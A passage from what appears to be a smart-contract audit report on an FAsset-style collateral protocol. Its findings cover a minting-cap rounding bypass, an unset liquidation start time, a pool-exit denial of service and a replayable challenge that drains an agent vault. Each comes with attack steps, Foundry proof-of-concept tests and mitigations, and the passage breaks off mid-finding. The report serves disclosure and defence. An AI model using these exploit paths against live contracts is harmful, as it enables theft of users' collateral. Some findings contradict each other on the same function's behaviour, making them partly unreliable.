        // Arrange: set two pool collateral types (old and new WNat), with higher minCR on the new one
        AssetManagerState.State storage state = AssetManagerState.get();
        state.collateralTokens.push();
        state.collateralTokens.push();
        // old pool WNat at index 0
        CollateralTypeInt.Data storage oldPool = state.collateralTokens[0];
        oldPool.collateralClass = CollateralType.Class.POOL;
        oldPool.token = IERC20(address(0x1001));
        oldPool.minCollateralRatioBIPS = 15000; // 1.5x
        oldPool.safetyMinCollateralRatioBIPS = 16000;
        // new pool WNat at index 1 with stricter ratios
        CollateralTypeInt.Data storage newPool = state.collateralTokens[1];
        newPool.collateralClass = CollateralType.Class.POOL;
        newPool.token = IERC20(address(0x1002));
        newPool.minCollateralRatioBIPS = 17000; // 1.7x (stricter)
        newPool.safetyMinCollateralRatioBIPS = 18000;
        state.poolCollateralIndex = 1; // global system points to new pool collateral type

        // Create agent on old index (unsynced, i.e., did not call upgradeWNatContract)
        address agentVault = address(0xA11CE);
        Agent.State storage agent = Agent.getWithoutCheck(agentVault);
        agent.poolCollateralIndex = 0; // still on old type
        agent.mintingPoolCollateralRatioBIPS = 0; // default -> Math.max(0, systemMin)

        // Act: compute pool minting min CR via library using agent's (unsynced) index
        (uint256 mintingMinCR, uint256 systemMinCR) = AgentCollateral.mintingMinCollateralRatio(agent, Collateral.Kind.POOL);

        // Assert: values reflect OLD ratios (15000) although the system pool index now mandates 17000
        assertEq(systemMinCR, 15000, "systemMinCR for unsynced agent uses old pool type");
        assertEq(mintingMinCR, 15000, "minting min CR for unsynced agent is lower than new system requirement");
        // Double-check that the global pool index actually requires stricter CR
        CollateralTypeInt.Data storage sysPool = state.collateralTokens[state.poolCollateralIndex];
        assertEq(uint256(sysPool.minCollateralRatioBIPS), 17000, "global system pool minCR is stricter (1.7x)");
        // Effect: agent can pass CR checks at 1.5x while governance requires 1.7x after WNat rotation
    }
}


## Suggested Mitigation
Make pool-collateral ratio reads independent of per-agent indices when enforcing system minima, e.g., use state.poolCollateralIndex for Collateral.Kind.POOL thresholds in AgentCollateral and Liquidation. Additionally, add a governance/batch function to force-sync agents (or make upgradeWNatContract permissionless when mismatch) so agent.poolCollateralIndex and the pool’s WNat are updated automatically on first interaction. Optionally, block minting/agent operations when agent.poolCollateralIndex != state.poolCollateralIndex until synchronization completes.





 **Derived From** : Minting cap check floors pool fee to AMG, enabling 1‑AMG cap bypass

## [M-25]. Sum-of-floors in Minting.checkMintingCap allows exceeding minting cap by 1 AMG and can brick further minting

## Derived From Pattern/Invariant
Minting cap check floors pool fee to AMG, enabling 1‑AMG cap bypass

## Exploit Type
RoundingError

## Location
Minting.checkMintingCap

## Minimim Privilege Required
Permissionless

## Description
checkMintingCap computes current supply in AMG as floor(totalSupplyUBA / granularity) and the proposed increase as valueAMG + floor(poolFeeUBA / granularity). Because floor(a) + floor(b) ≤ floor(a + b), when the existing totalSupply UBA remainder and the poolFeeUBA remainder together cross a granularity boundary, the check underestimates the post-mint AMG by 1. This lets a mint pass the cap check yet end with totalAMG > cap by 1 AMG. After this overshoot, future mints fail (DoS) until enough redemptions happen. Vulnerable snippet:

Minting.checkMintingCap:
  totalMintedUBA = IERC20(settings.fAsset).totalSupply();
  totalAMG = state.totalReservedCollateralAMG + Conversion.convertUBAToAmg(totalMintedUBA); // floor
  require(totalAMG + _increaseAMG <= mintingCapAMG, MintingCapExceeded());

Callers compute _increaseAMG = valueAMG + Conversion.convertUBAToAmg(poolFeeUBA); // floor

## Impact
A minter can push total minted above the global cap by 1 AMG, violating the cap invariant and potentially freezing all further minting (any new mint will fail the cap check) until redemptions/admin action restore headroom.

## Proof of Concept
Setup assetMintingGranularityUBA = 1000. Let current totalSupplyUBA = S = 1000*12345 + 600 (so floor(S/1000) = 12345, remainder 600). Let poolFeeUBA = 1400 (floor=1, remainder 400). Choose capAMG = 12345 + 1 + valueAMG with valueAMG=10, reservedAMG=0. The check uses sum-of-floors: 12345 + 10 + 1 = cap → passes. But the post-mint AMG uses floor-of-sum on supply: floor((S + poolFeeUBA)/1000) = 12345 + 2 (carry from 600+400 ≥ 1000). So actual post-mint totalAMG = 12345 + 2 + 10 = cap + 1 AMG. Next mints fail since floor(totalSupply/1000) > cap.

## Proof of Code
pragma solidity ^0.8.27;
import "forge-std/Test.sol";

contract MintingCapRoundingTest is Test {
    function _convertUBAToAmg(uint256 uba, uint256 granularity) internal pure returns (uint256) {
        return uba / granularity; // floor
    }
    function _convertAmgToUBA(uint256 amg, uint256 granularity) internal pure returns (uint256) {
        return amg * granularity;
    }

    // Simulate current on-chain logic (sum of floors)
    function _checkMintingCap_sumOfFloors(
        uint256 totalSupplyUBA,
        uint256 reservedAMG,
        uint256 capAMG,
        uint256 valueAMG,
        uint256 poolFeeUBA,
        uint256 granularity
    ) internal pure returns (bool) {
        uint256 totalAMG = reservedAMG + _convertUBAToAmg(totalSupplyUBA, granularity);
        uint256 increaseAMG = valueAMG + _convertUBAToAmg(poolFeeUBA, granularity);
        return totalAMG + increaseAMG <= capAMG;
    }

    // Compute true post-mint AMG if mint is executed
    function _postMintTotalAMG_floorOfSum(
        uint256 totalSupplyUBA,
        uint256 reservedAMG,
        uint256 valueAMG,
        uint256 poolFeeUBA,
        uint256 granularity
    ) internal pure returns (uint256) {
        // After mint: supply increases by valueAMG (exact AMG in UBA) and poolFeeUBA (raw UBA)
        uint256 afterSupplyUBA = totalSupplyUBA + _convertAmgToUBA(valueAMG, granularity) + poolFeeUBA;
        uint256 afterSupplyAMG = _convertUBAToAmg(afterSupplyUBA, granularity);
        return reservedAMG + afterSupplyAMG; // add reserved (unchanged here)
    }

    function test_RoundingCarryBypassesCapAndBricksLaterMints() public {
        uint256 granularity = 1000; // assetMintingGranularityUBA
        // Current supply: 12345 AMG + remainder 600 UBA
        uint256 sFloor = 12345;
        uint256 totalSupplyUBA = sFloor * granularity + 600; // remainder 600

        // Pool fee chosen with remainder 400 UBA (total remainder 600+400=1000 → carry 1 AMG)
        uint256 poolFeeUBA = 1400; // floor=1, rem=400
        uint256 valueAMG = 10;
        uint256 reservedAMG = 0;
        // Cap picked so that sum-of-floors check is exactly equal
        uint256 capAMG = sFloor + _convertUBAToAmg(poolFeeUBA, granularity) + valueAMG; // 12345 + 1 + 10

        // With current logic, check passes
        bool passes = _checkMintingCap_sumOfFloors(totalSupplyUBA, reservedAMG, capAMG, valueAMG, poolFeeUBA, granularity);
        assertTrue(passes, "sum-of-floors check should pass");

        // But actual post-mint AMG uses floor-of-sum on (totalSupply + poolFee), causing a +1 AMG carry
        uint256 afterAMG = _postMintTotalAMG_floorOfSum(totalSupplyUBA, reservedAMG, valueAMG, poolFeeUBA, granularity);
        // Expected: sFloor + 2 (carry) + valueAMG = capAMG + 1
        assertEq(afterAMG, capAMG + 1, "post-mint AMG must exceed cap by 1");

        // Show that any further positive mint would now fail (DoS) under the same check
        // Next check uses floor(totalSupplyAfter/granularity) which is sFloor+2 > capAMG - reserved
        uint256 totalSupplyAfterUBA = totalSupplyUBA + _convertAmgToUBA(valueAMG, granularity) + poolFeeUBA;
        bool nextMintPossible = _checkMintingCap_sumOfFloors(totalSupplyAfterUBA, reservedAMG, capAMG, 1, 0, granularity); // try +1 AMG
        assertTrue(!nextMintPossible, "further mints must be blocked after overshoot");
    }
}


## Suggested Mitigation
Eliminate sum-of-floors. In checkMintingCap, compute the post-mint AMG using floor-of-sum in UBA for the part that carries remainder: require(state.totalReservedCollateralAMG + valueAMG + Conversion.convertUBAToAmg(totalMintedUBA + poolFeeUBA) <= mintingCapAMG). To do so, change the function signature (or add a new overload) to accept valueAMG and poolFeeUBA separately, and update all call sites (selfMint, mintFromFreeUnderlying, and reservation flows) to pass both. This ensures the remainders from totalSupplyUBA and poolFeeUBA are combined before flooring, removing the 1-AMG undercount. Alternatively, precompute postMintSupplyUBA = totalSupplyUBA + poolFeeUBA and use its floor-to-AMG, then add valueAMG in AMG.





 **Derived From** : On any successful challenge call, after _liquidateAndRewardChallenger returns: Agent.get(_agentVault).status == Agent.Status.FULL_LIQUIDATION && Agent.get(_agentVault).liquidationStartedAt > 0

## [H-26]. Full-liquidation start timestamp not set on challenge path enables instant max-premium liquidations

## Derived From Pattern/Invariant
On any successful challenge call, after _liquidateAndRewardChallenger returns: Agent.get(_agentVault).status == Agent.Status.FULL_LIQUIDATION && Agent.get(_agentVault).liquidationStartedAt > 0

## Exploit Type
AccountingInvariantViolation

## Location
ChallengesFacet._liquidateAndRewardChallenger

## Minimim Privilege Required
Permissionless

## Description
In ChallengesFacet._liquidateAndRewardChallenger the first action is Liquidation.startFullLiquidation(_agent). However, the implementation of Liquidation.startFullLiquidation only assigns liquidationStartedAt when the agent is already in FULL_LIQUIDATION or DESTROYING. Because _validateAgentStatus forbids both statuses, startFullLiquidation is always called from NORMAL and thus leaves liquidationStartedAt at 0, while still setting status = FULL_LIQUIDATION. Vulnerable snippet (slithir view):

Liquidation.startFullLiquidation:
  if (_agent.status == FULL_LIQUIDATION || _agent.status == DESTROYING) {
    if (_agent.liquidationStartedAt == 0) {
      _agent.liquidationStartedAt = block.timestamp;
    }
  }
  _agent.status = FULL_LIQUIDATION;

This violates the state machine invariant (status must be FULL_LIQUIDATION and liquidationStartedAt > 0). Downstream, liquidation premium-step logic typically depends on (block.timestamp - liquidationStartedAt). With liquidationStartedAt left at 0, the elapsed time is enormous, causing immediate use of the highest premium tier. A permissionless liquidator can burn FAssets to receive collateral with maximum premium immediately, extracting excess value from the pool and agent versus intended time-gated premiums.

## Impact
Immediate reward distortion: liquidators get the maximum liquidation premium from pool collateral right after a successful challenge, enabling outsized payouts and accelerated drain of pool/agent collateral contrary to design.

## Proof of Concept
- Precondition: An agent in NORMAL status with nonzero minted backing and healthy pool/vault balances. Attacker holds (or buys) FAssets to act as liquidator.
- Step 1: Attacker submits a valid challenge (e.g., illegalPaymentChallenge) against the agent. This calls _liquidateAndRewardChallenger -> Liquidation.startFullLiquidation.
- Step 2: Due to the bug, status becomes FULL_LIQUIDATION but liquidationStartedAt remains 0.
- Step 3: Attacker immediately calls liquidate(_agentVault, amountUBA). Premium step computation sees (now - 0), selects highest premium tier, paying attacker maximal premium from the pool (and vault per strategy). This yields greater-than-intended payout at t=0.
- Step 4: Repeat liquidations until caps/availability stop them; profit is the premium difference achieved by skipping the time ramp.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Liquidation} from "contracts/assetManager/library/Liquidation.sol";
import {Agent} from "contracts/assetManager/library/data/Agent.sol";

contract LiquidationHarness {
    using Liquidation for Agent.State;
    Agent.State internal agent;

    function setStatus(Agent.Status s) external { agent.status = s; }
    function startedAt() external view returns (uint64) { return agent.liquidationStartedAt; }
    function status() external view returns (Agent.Status) { return agent.status; }
    function startFull() external { Liquidation.startFullLiquidation(agent); }
}

contract FullLiquidationStartTimestampTest is Test {
    LiquidationHarness h;

    function setUp() public {
        h = new LiquidationHarness();
    }

    function test_liquidationStartTimestampNotSetFromNormal() public {
        // Agent starts in NORMAL; startedAt should be 0
        vm.warp(1_000_000);
        h.setStatus(Agent.Status.NORMAL);
        assertEq(uint64(h.startedAt()), 0, "pre: startedAt must be 0");

        // Trigger full liquidation start
        h.startFull();

        // BUG: status flips to FULL_LIQUIDATION but liquidationStartedAt remains 0
        assertEq(uint8(h.status()), uint8(Agent.Status.FULL_LIQUIDATION), "status must be FULL_LIQUIDATION");
        assertEq(uint64(h.startedAt()), 0, "BUG: liquidationStartedAt should have been set > 0");
    }
}


## Suggested Mitigation
In Liquidation.startFullLiquidation, set liquidationStartedAt unconditionally when transitioning into FULL_LIQUIDATION (i.e., when it is 0), regardless of prior status. Example:

if (_agent.liquidationStartedAt == 0) {
    _agent.liquidationStartedAt = uint64(block.timestamp);
}
_agent.status = Agent.Status.FULL_LIQUIDATION;

This guarantees that any path invoking full liquidation (including ChallengesFacet) sets a strictly-positive start timestamp and preserves the intended time-ramped premium schedule.





 **Derived From** : (post.totalCollateral == 0 || post.totalCollateral >= MIN_NAT_BALANCE_AFTER_EXIT) && (post.token.totalSupply() == 0 || post.token.totalSupply() >= MIN_TOKEN_SUPPLY_AFTER_EXIT)

## [M-27]. Exits can be permanently DoS’ed when pool NAT falls below MIN_NAT_BALANCE_AFTER_EXIT via protocol payout before user exit

## Derived From Pattern/Invariant
(post.totalCollateral == 0 || post.totalCollateral >= MIN_NAT_BALANCE_AFTER_EXIT) && (post.token.totalSupply() == 0 || post.token.totalSupply() >= MIN_TOKEN_SUPPLY_AFTER_EXIT)

## Exploit Type
FrontrunMev

## Location
CollateralPool.exit

## Minimim Privilege Required
Permissionless

## Description
The exit and selfCloseExit flows enforce hard post-conditions: after burning pool tokens, either the remaining NAT is zero (fully drained) or at least MIN_NAT_BALANCE_AFTER_EXIT, and either totalSupply is zero or at least MIN_TOKEN_SUPPLY_AFTER_EXIT. This is checked pre-withdrawal in _requireMinNatSupplyAfterExit/_requireMinTokenSupplyAfterExit. However, the pool’s totalCollateral can legitimately be reduced by the protocol (AssetManager) through payout (e.g., redemption default or liquidation premium) without going through exit. If such a payout leaves totalCollateral < MIN_NAT_BALANCE_AFTER_EXIT while totalSupply > 0 (and distributed among multiple holders), then no holder can pass _requireMinNatSupplyAfterExit unless they burn 100% of totalSupply (which is impractical if supply is distributed). Hence all standard exits are permanently reverted (CollateralAfterExitTooLow), freezing user funds until an admin tops up NAT or a single entity aggregates all CPTs. Vulnerable snippet enforcing the hard minimum: 

function _requireMinNatSupplyAfterExit(uint256 _natShare) internal view { require(totalCollateral == _natShare || totalCollateral - _natShare >= MIN_NAT_BALANCE_AFTER_EXIT, CollateralAfterExitTooLow()); }

This invariant is sound when exits are the only way totalCollateral changes. But because payout can externally lower totalCollateral below MIN just before user exits, exits become uncallable and state is stuck.

## Impact
Permanent/indefinite DoS of exits (funds frozen) until admin intervention (depositNat) or impractical full-supply aggregation; users cannot withdraw their share.

## Proof of Concept
- Two users (Alice, Bob) enter the pool (>= 1 FLR each). Total supply and totalCollateral are established.
- A permissionless protocol flow (e.g., liquidation) triggers AssetManager to call CollateralPool.payout, transferring WNat out so that totalCollateral < MIN_NAT_BALANCE_AFTER_EXIT (e.g., 0.5 FLR left).
- Now any exit with _tokenShare < totalSupply fails _requireMinNatSupplyAfterExit because leftover becomes < MIN and not equal to zero; only burning 100% of totalSupply would pass, which is infeasible across many holders.
- Result: All users’ exits revert, creating a stuck pool until AssetManager tops up collateral.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {CollateralPool} from "contracts/collateralPool/implementation/CollateralPool.sol";
import {CollateralPoolToken} from "contracts/collateralPool/implementation/CollateralPoolToken.sol";
import {IWNat} from "contracts/flareSmartContracts/interfaces/IWNat.sol";

// Minimal WNat mock (ERC20-like) to support deposit/withdraw and transfers
contract MockWNat is IWNat {
    string public name = "MockWNat";
    string public symbol = "MWNAT";
    uint8 public decimals = 18;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    receive() external payable {}

    function deposit() external payable override {
        balanceOf[msg.sender] += msg.value;
        totalSupply += msg.value;
    }
    function depositTo(address to) external payable override {
        balanceOf[to] += msg.value;
        totalSupply += msg.value;
    }
    function withdraw(uint256 amount) external override {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        (bool ok,) = payable(msg.sender).call{value: amount}("");
        require(ok, "eth out");
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    // Unused in test
    function delegate(address, uint256) external {}
    function governanceVotePower() external pure returns (address) { return address(0); }
}

// Minimal AssetManager mock exposing selectors CollateralPool touches
contract MockAssetManager {
    IWNat public wnat;
    constructor(IWNat _w) { wnat = _w; }
    function getWNat() external view returns (IWNat) { return wnat; }
    function updateCollateral(address, IWNat) external {}
    function assetPriceNatWei() external pure returns (uint256 mul, uint256 div) { return (1, 1); }
    function getFAssetsBackedByPool(address) external pure returns (uint256) { return 0; }
    function getAgentMinPoolCollateralRatioBIPS(address) external pure returns (uint256) { return 10000; }
    function maxRedemptionFromAgent(address) external pure returns (uint256) { return type(uint256).max; }
    function lotSize() external pure returns (uint256) { return 1; }
    function isAgentVaultOwner(address, address) external pure returns (bool) { return false; }
    function getCollateralPoolTokenTimelockSeconds() external pure returns (uint256) { return 0; }
}

contract ExitMinNatDoS_Test is Test {
    CollateralPool pool;
    CollateralPoolToken token;
    MockWNat wnat;
    MockAssetManager am;
    address agentVault = address(0xA11CE);
    address alice = address(0xBEEF);
    address bob   = address(0xCAFE);

    function setUp() public {
        vm.deal(alice, 10 ether);
        vm.deal(bob,   10 ether);

        wnat = new MockWNat();
        am = new MockAssetManager(wnat);
        pool = new CollateralPool(agentVault, address(am), address(0), uint32(16000));

        // deploy token and set it on pool (onlyAssetManager)
        token = new CollateralPoolToken(address(pool), "FCPT-TEST-SUFFIX", "FCPT-TEST-SUFFIX");
        vm.prank(address(am));
        pool.setPoolToken(address(token));

        // Alice and Bob enter with >= 1 FLR each so token minting & wnat deposit happen
        vm.prank(alice);
        pool.enter{value: 2 ether}();
        vm.prank(bob);
        pool.enter{value: 2 ether}();

        // Sanity
        assertEq(address(wnat).balance, 4 ether, "wnat holds wrapped ETH");
        assertEq(pool.totalCollateral(), 4 ether, "pool collateral");
        assertEq(token.totalSupply(), 4 ether, "token supply mirrors initial collateral");
    }

    function test_DoS_exits_when_totalCollateral_below_MIN() public {
        // AssetManager payout drains pool to dust (< MIN_NAT_BALANCE_AFTER_EXIT == 1 ether)
        // Only AssetManager can call payout
        vm.prank(address(am));
        pool.payout(address(0xD00D), 3.5 ether, 0);

        // Now pool has 0.5 ether left (< MIN), supply still > 0 and distributed
        assertEq(pool.totalCollateral(), 0.5 ether, "dust collateral < MIN");
        assertEq(token.totalSupply(), 4 ether, "supply unchanged");

        // Alice tries to exit her full balance -> must revert CollateralAfterExitTooLow
        uint256 aliceBal = token.balanceOf(alice);
        vm.startPrank(alice);
        bytes4 sel = CollateralPool.CollateralAfterExitTooLow.selector;
        vm.expectRevert(abi.encodeWithSelector(sel));
        pool.exit(aliceBal);
        vm.stopPrank();

        // Bob also cannot exit
        uint256 bobBal = token.balanceOf(bob);
        vm.startPrank(bob);
        vm.expectRevert(abi.encodeWithSelector(sel));
        pool.exit(bobBal);
        vm.stopPrank();

        // State unchanged (funds frozen)
        assertEq(pool.totalCollateral(), 0.5 ether, "still stuck collateral");
        assertEq(token.totalSupply(), 4 ether, "supply remains");
    }
}


## Suggested Mitigation
Make exits tolerant when the pool is already in a dust state due to protocol-side operations. Concretely, bypass the hard post-exit minima when current balances are already below their configured thresholds, and keep the exit-CR check in place:

- In CollateralPool._requireMinNatSupplyAfterExit:
  if (totalCollateral <= MIN_NAT_BALANCE_AFTER_EXIT) return;  // allow proportional exits to drain dust
  require(totalCollateral == _natShare || totalCollateral - _natShare >= MIN_NAT_BALANCE_AFTER_EXIT, CollateralAfterExitTooLow());

- In CollateralPool._requireMinTokenSupplyAfterExit:
  uint256 totalPoolTokens = token.totalSupply();
  if (totalPoolTokens <= MIN_TOKEN_SUPPLY_AFTER_EXIT) return;  // allow proportional exits when already in token-supply dust
  require(totalPoolTokens == _tokenShare || totalPoolTokens - _tokenShare >= MIN_TOKEN_SUPPLY_AFTER_EXIT, TokenSupplyAfterExitTooLow());

Rationale: If protocol payout or slashing pushes the pool into a dust state, enforcing the minima makes all exits impossible unless a single holder owns 100% of supply. Allowing proportional exits when already below minima lets holders unwind fairly while the exit collateral ratio guard (_staysAboveExitCR) still protects solvency.

Optional hardening (not strictly required if above is implemented):
- In AssetManager-driven payout paths, avoid leaving totalCollateral in (0, MIN_NAT_BALANCE_AFTER_EXIT) range unless also fully draining to zero; or automatically top-up via depositNat when a payout would drop below MIN.
- Alternatively, add a permissionless consolidatedDustExit() that aggregates multiple holders’ burns in a single call to drain the pool when below minima.





 **Derived From** : Duplicate-payment challenge can be replayed to drain agent reward

## [H-28]. Replayable doublePaymentChallenge pays the same proofs repeatedly due to missing consumption and broken full liquidation guard

## Derived From Pattern/Invariant
Duplicate-payment challenge can be replayed to drain agent reward

## Exploit Type
ReplayAttack

## Location
ChallengesFacet.doublePaymentChallenge

## Minimim Privilege Required
Permissionless

## Description
ChallengesFacet.doublePaymentChallenge validates two balance-decreasing proofs, checks equal standardPaymentReference and different txIds, and then calls _liquidateAndRewardChallenger(agent, msg.sender, agent.mintedAMG). It never records either transaction or the shared payment reference as consumed in PaymentConfirmations (no executed[proof] guard), so the same pair of proofs can be reused. The intended replay stop is full liquidation, but Liquidation.startFullLiquidation has an inverted guard and only executes when status is already FULL_LIQUIDATION or DESTROYING, so from NORMAL status it is a no-op: the agent status remains unchanged and _validateAgentStatus keeps allowing calls. Each call transfers the challenger reward from the agent’s vault via AgentPayout.payoutFromVault, letting a permissionless EOA replay the same proofs and drain the vault. Vulnerable snippets: in doublePaymentChallenge: require(_payment1.data.requestBody.transactionId != _payment2.data.requestBody.transactionId,...); require(_payment1.data.responseBody.standardPaymentReference == _payment2.data.responseBody.standardPaymentReference,...); _liquidateAndRewardChallenger(agent, msg.sender, agent.mintedAMG); (no write to PaymentConfirmations). In Liquidation.startFullLiquidation: if (_agent.status == FULL_LIQUIDATION || _agent.status == DESTROYING) { ... _agent.status = FULL_LIQUIDATION; } – the condition is inverted, so a NORMAL agent is never moved to FULL_LIQUIDATION.

## Impact
A permissionless attacker can resubmit the same two valid proofs to repeatedly claim the challenger reward, draining the agent vault collateral via repeated AgentVault.payout calls.

## Proof of Concept
1) Attacker obtains two valid IBalanceDecreasingTransaction proofs from the same agent underlying address with equal standardPaymentReference and different txIds. 2) Call doublePaymentChallenge(proof1, proof2, agentVault). Because Liquidation.startFullLiquidation is a no-op from NORMAL status, the agent remains non-liquidating, and the challenger reward is paid from the agent vault. 3) Repeat the same call with the same pair of proofs; no anti-replay is enforced and status is still not FULL_LIQUIDATION, so reward is paid again. 4) Loop until the agent vault token balance is exhausted. Profit: the attacker accumulates the vault token (collateral) equal to the reward amount on every replay.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {ChallengesFacet} from "contracts/assetManager/facets/ChallengesFacet.sol";
import {AssetManagerSettings} from "contracts/userInterfaces/data/AssetManagerSettings.sol";
import {Globals} from "contracts/assetManager/library/Globals.sol";
import {Agent} from "contracts/assetManager/library/data/Agent.sol";
import {AssetManagerState} from "contracts/assetManager/library/data/AssetManagerState.sol";
import {CollateralTypeInt} from "contracts/assetManager/library/data/CollateralTypeInt.sol";
import {AgentVault} from "contracts/agentVault/implementation/AgentVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {FakePriceReader} from "contracts/ftso/mock/FakePriceReader.sol";
import {IBalanceDecreasingTransaction} from "@flarenetwork/flare-periphery-contracts/flare/IFdcVerification.sol";

// Minimal stub to satisfy AgentVault constructor typing
interface IIAssetManager {}

contract TestERC20 is ERC20 {
    constructor() ERC20("C1", "C1") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockFdcVerification {
    function verifyBalanceDecreasingTransaction(IBalanceDecreasingTransaction.Proof calldata) external pure returns (bool) { return true; }
}

contract ChallengesFacetHarness is ChallengesFacet {
    function setSettings(address _fdc, address _priceReader, bytes32 _chainId, uint256 _rewardBIPS, uint256 _rewardUSD5) external {
        AssetManagerSettings.Data storage s = Globals.getSettings();
        s.fdcVerification = _fdc;
        s.priceReader = _priceReader;
        s.chainId = _chainId;
        s.paymentChallengeRewardBIPS = _rewardBIPS;
        s.paymentChallengeRewardUSD5 = _rewardUSD5;
    }
    function setAgent(address _agentVault, bytes32 _underlyingHash, uint64 _mintedAMG, uint16 _vaultCollateralIndex, Agent.Status _status) external {
        Agent.State storage a = Agent.getWithoutCheck(_agentVault);
        a.underlyingAddressHash = _underlyingHash;
        a.mintedAMG = _mintedAMG;
        a.vaultCollateralIndex = _vaultCollateralIndex;
        a.status = _status;
    }
    function addCollateralType(IERC20 _token, string memory _tokenSym, string memory _assetSym, uint8 _decimals) external returns (uint16 idx) {
        AssetManagerState.State storage st = AssetManagerState.get();
        idx = uint16(st.collateralTokens.length);
        st.collateralTokens.push();
        CollateralTypeInt.Data storage c = st.collateralTokens[idx];
        c.token = _token;
        c.tokenFtsoSymbol = _tokenSym;
        c.assetFtsoSymbol = _assetSym;
        c.decimals = _decimals;
        c.directPricePair = false;
    }
    function getStatus(address _agentVault) external view returns (Agent.Status) {
        Agent.State storage a = Agent.getWithoutCheck(_agentVault);
        return a.status;
    }
}

contract DoublePaymentReplayTest is Test {
    ChallengesFacetHarness internal facet;
    TestERC20 internal c1;
    AgentVault internal vault;
    FakePriceReader internal pr;
    MockFdcVerification internal fdc;
    address internal attacker;

    function setUp() public {
        attacker = address(0xBEEF);
        facet = new ChallengesFacetHarness();
        c1 = new TestERC20();
        pr = new FakePriceReader(address(this));
        fdc = new MockFdcVerification();

        // Price setup (token and asset symbols used by Conversion)
        pr.setDecimals("ASSET", 8);
        pr.setPrice("ASSET", 1e8);
        pr.setDecimals("C1", 18);
        pr.setPrice("C1", 1e18);
        pr.finalizePrices();

        // Settings: chainId, priceReader, fdc, non-zero reward bips, fixed USD5=0
        facet.setSettings(address(fdc), address(pr), bytes32("CHAIN"), 1000 /*10%*/, 0);

        // Collateral type index 0 using C1
        uint16 idx = facet.addCollateralType(IERC20(address(c1)), "C1", "ASSET", 18);

        // Deploy agent vault with assetManager set to facet so AgentVault.payout onlyAssetManager passes
        vault = new AgentVault(IIAssetManager(address(facet)));

        // Fund the vault with collateral
        c1.mint(address(vault), 1_000_000 ether);

        // Initialize agent state
        facet.setAgent(address(vault), keccak256("agent.underlying"), 1_000_000 /*AMG*/, idx, Agent.Status.NORMAL);
    }

    function _proof(bytes32 txId, bytes32 ref, bytes32 srcAddrHash) internal view returns (IBalanceDecreasingTransaction.Proof memory p) {
        p.data.sourceId = bytes32("CHAIN");
        p.data.requestBody.transactionId = txId;
        p.data.responseBody.sourceAddressHash = srcAddrHash;
        p.data.responseBody.standardPaymentReference = ref;
        p.data.responseBody.spentAmount = 1; // value unused by doublePaymentChallenge
    }

    function test_replayDuplicatePaymentChallengeDrainsVault() public {
        bytes32 src = keccak256("agent.underlying");
        bytes32 ref = keccak256("same-ref");
        IBalanceDecreasingTransaction.Proof memory p1 = _proof(bytes32("tx-1"), ref, src);
        IBalanceDecreasingTransaction.Proof memory p2 = _proof(bytes32("tx-2"), ref, src);

        uint256 attackerBal0 = c1.balanceOf(attacker);
        uint256 vaultBal0 = c1.balanceOf(address(vault));

        vm.prank(attacker);
        facet.doublePaymentChallenge(p1, p2, address(vault));

        uint256 attackerBal1 = c1.balanceOf(attacker);
        uint256 vaultBal1 = c1.balanceOf(address(vault));
        assertGt(attackerBal1, attackerBal0, "first reward not paid");
        assertLt(vaultBal1, vaultBal0, "vault not debited");

        // Due to inverted guard, status remains NORMAL, enabling replay
        assertEq(uint256(facet.getStatus(address(vault))), uint256(Agent.Status.NORMAL), "status unexpectedly changed");

        // Replay same proofs and get paid again
        vm.prank(attacker);
        facet.doublePaymentChallenge(p1, p2, address(vault));

        uint256 attackerBal2 = c1.balanceOf(attacker);
        uint256 vaultBal2 = c1.balanceOf(address(vault));
        assertGt(attackerBal2, attackerBal1, "second reward not paid");
        assertLt(vaultBal2, vaultBal1, "vault not debited on replay");
    }
}


## Suggested Mitigation
Apply both fixes:
1) Correct the liquidation guard:
   In Liquidation.startFullLiquidation, start liquidation when the agent is NOT already in FULL_LIQUIDATION or DESTROYING. For example:
     if (_agent.status != Agent.Status.FULL_LIQUIDATION && _agent.status != Agent.Status.DESTROYING) {
         if (_agent.liquidationStartedAt == 0) {
             _agent.liquidationStartedAt = uint64(block.timestamp);
         }
         _agent.status = Agent.Status.FULL_LIQUIDATION;
         emit IAssetManagerEvents.FullLiquidationStarted(_agent.vaultAddress(), block.timestamp);
     }
   This ensures successful challenges move the agent to FULL_LIQUIDATION and subsequent challenge attempts revert in _validateAgentStatus.

2) Add explicit anti-replay in doublePaymentChallenge:
   Persistently mark the provided proofs (or their shared standardPaymentReference) as consumed before rewarding. For example, after verifying both proofs and before calling _liquidateAndRewardChallenger:
     - Compute txKeys via PaymentConfirmations.transactionKey(sourceAddressHash, transactionId) for both proofs.
     - Require neither txKey has been used; then mark them as used.
     - Optionally add a per-agent mapping for consumed standardPaymentReference to block re-use of a different second tx with the same reference.
   If PaymentConfirmations lacks a setter, extend the library with a function like setTransactionConfirmed(State storage, bytes32 txKey) or setTransactionConfirmed(State storage, IBalanceDecreasingTransaction.Proof calldata) to store a non-zero sentinel in verifiedPayments.

Both changes together eliminate the replay vector even under future refactors and provide defense-in-depth.





 **Derived From** : Full liquidation start time not set on challenge, breaking liquidation timing

## [M-29]. startFullLiquidation leaves liquidationStartedAt = 0 when triggered by ChallengesFacet, pushing liquidation premium to max immediately

## Derived From Pattern/Invariant
Full liquidation start time not set on challenge, breaking liquidation timing

## Exploit Type
AccountingInvariantViolation

## Location
Liquidation.startFullLiquidation

## Minimim Privilege Required
Permissionless

## Description
